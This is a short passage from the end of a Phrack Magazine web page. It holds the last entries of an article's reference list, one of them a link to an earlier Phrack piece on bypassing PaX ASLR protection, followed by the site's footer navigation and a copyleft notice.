     http://www.phrack.org/issues.html?issue=64&amp;id=15#article

[11] Bypassing PaX ASLR protection
     http://www.phrack.org/issues.html?issue=59&amp;id=9#article


--------[ EOF
</pre>

</div>
</div>

</center>

<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]
</div>

<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
</body>
</html>
